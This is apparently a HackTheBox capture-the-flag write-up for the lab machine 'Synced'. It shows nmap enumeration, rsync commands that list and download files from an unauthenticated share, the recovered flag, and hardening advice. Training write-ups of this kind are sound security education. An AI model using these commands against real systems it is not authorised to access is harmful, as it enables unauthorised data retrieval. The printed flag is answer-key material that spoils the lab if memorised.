# Synced - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Linux
**IP Address:** 10.129.14.165
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Synced**. 

*   **Initial Access:** Unauthenticated `rsync` share access (Anonymous).
*   **Privilege Escalation:** Not required for this Tier 0 machine.
*   **Key Learning Points:** 
    * Enumerating `rsync` modules and shares.
    * Using the `rsync` command-line tool to list and transfer files from unauthenticated shares.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 873/tcp | rsync | protocol version 31 | Unauthenticated access allowed to modules. |

**Nmap Command:**
```bash
nmap -p 873 -sC -sV -oN nmap/synced 10.129.14.165
```

## 2.2. Web Enumeration
**Strategy:** No web services were found on the target machine.

---

# 3. Initial Access (Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Unauthenticated `rsync` share access.
*   **Vector:** `rsync` daemon on port 873.

## 3.2. Exploitation Path
The reconnaissance phase identified an `rsync` service on port 873. Using the `rsync` tool, we queried the target for available modules. The `public` module was identified as an anonymous share. Listing the contents of the `public` module revealed the `flag.txt` file, which was then successfully synchronized (downloaded) to the local machine.

**Payload/Tool:**
```bash
# List available modules
rsync --list-only 10.129.14.165::

# List files in the public module
rsync --list-only 10.129.14.165::public

# Download the flag
rsync 10.129.14.165::public/flag.txt flag.txt
```

**Flag:**
```bash
# 72eaf5344ebb84908ae543a719830519
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Not applicable for this target.

---

# 5. Credentials & Loot

| Service | Module | Note |
| :--- | :--- | :--- |
| rsync | public | Anonymous share containing the flag. |

---

# 6. Recommendations & Mitigation
1. **Enable Authentication:** Configure the `rsync` daemon to require authentication for all modules using the `auth users` and `secrets file` directives in `rsyncd.conf`.
2. **Restrict Access by IP:** Use the `hosts allow` and `hosts deny` directives to limit which IP addresses can connect to the `rsync` service.
3. **Use SSH for Syncing:** Disable the `rsync` daemon and use `rsync` over SSH for secure, authenticated file transfers.
